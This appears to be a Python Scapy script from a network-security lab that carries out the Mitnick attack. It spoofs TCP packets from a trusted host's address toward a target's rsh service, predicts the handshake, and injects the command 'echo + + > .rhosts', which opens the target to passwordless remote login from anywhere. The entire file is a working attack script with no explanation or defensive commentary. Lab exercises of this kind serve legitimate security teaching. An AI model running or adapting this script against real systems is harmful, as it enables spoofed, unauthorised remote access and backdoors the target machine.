#!usr/bin/python3
from scapy.all import *
import sys
X_IP_Address = "10.9.0.3"
X_Tml_PortNo = 512
X_Tml_PortNo_2 = 1021
Trusted_IP_Address = "10.9.0.4"
Trusted_PortNo = 1021
Trusted_PortNo_2 = 9088

def spoof_pkt(pkt):
	sequence_no = 647862699 + 1
	previous_ip = pkt[IP]
	previous_tcp = pkt[TCP]
	tcp_length = previous_ip.len - previous_ip.ihl*4 - previous_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(previous_ip.src, previous_tcp.sport,
		previous_ip.dst, previous_tcp.dport, previous_tcp.flags, tcp_length))

	if previous_tcp.flags == "SA":
		print("Sending Spoofed ACK Packet ...")
		IPLayer = IP(src=Trusted_IP_Address, dst=X_IP_Address)
		TCPLayer = TCP(sport=Trusted_PortNo,dport=X_Tml_PortNo,flags="A",
		 seq=sequence_no, ack= previous_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)
		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet ...")
		data = '9088\x00seed\x00seed\x00echo + + > .rhosts\x00'
		pkt = IPLayer/TCPLayer/data
		send(pkt,verbose=0)

	if previous_tcp.flags == 'S' and previous_tcp.dport == Trusted_PortNo_2 and previous_ip.dst == Trusted_IP_Address:
		sequence_num = 110086204
		print("Sending Spoofed SYN+ACK Packet for 2nd Connection...")
		IPLayer = IP(src=Trusted_IP_Address, dst=X_IP_Address)
		TCPLayer = TCP(sport=Trusted_PortNo_2,dport=X_Tml_PortNo_2,flags="SA",
		 seq=sequence_num, ack= previous_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)

def spoofing_SYN():
	print("Sending Spoofed SYN Packet ...")
	IPLayer = IP(src="10.9.0.4", dst="10.9.0.3")
	TCPLayer = TCP(sport=1021,dport=512,flags="S", seq=647862699)
	pkt = IPLayer/TCPLayer
	send(pkt,verbose=0)

def main():
	spoofing_SYN()
	pkt = sniff(filter="tcp and src host 10.9.0.3", prn=spoof_pkt)

if __name__ == "__main__":
	main()
